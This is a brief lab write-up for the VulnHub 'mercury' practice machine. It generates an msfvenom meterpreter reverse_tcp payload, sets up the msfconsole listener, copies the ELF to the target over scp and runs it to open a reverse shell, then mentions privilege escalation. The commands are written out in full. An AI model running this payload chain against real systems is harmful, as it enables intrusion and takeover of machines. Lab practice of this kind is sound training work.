# metasploit
we will again use the machine 'mercury' from vulnhub.  
since we were able to get access to the login credentials using sql injection, why not try to gain reverse shell/meterpreter access into the machine?  
For this lets use msfvenom to generate a payload and send it the the target machine which we will then execute in the said target machine to help us gain reverse shell access into the machine.  
- msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.56.103 LPORT=4444 -f elf > /tmp/mesc_x64.elf

Then inside msfconsole lets set the payload, target, listner and listening port by executing the below commands.  
- set PAYLOAD linux/x64/meterpreter/reverse_tcp
- set LHOST 192.168.56.103
- set LPORT 4444
- set ExitOnSession false
- exploit

Then we copy the payload 'mesc_x64.elf' from our kali to the target machine.  
- scp -P 22 /tmp/mesc_x64.elf linuxmaster@192.168.56.102:/tmp/mesc_x64.elf

And since we have remote access using ssh, lets make the payload 'mesc_x64.elf' an executable inside the target machine and run/execute it.
- chmod +x /tmp/mesc_x64.elf
- /tmp/mesc_x64.elf

Voilà! we have reverse shell of the target in our kali(attacker), from here we can remotely access files, perform privelage escalation and get root access.  
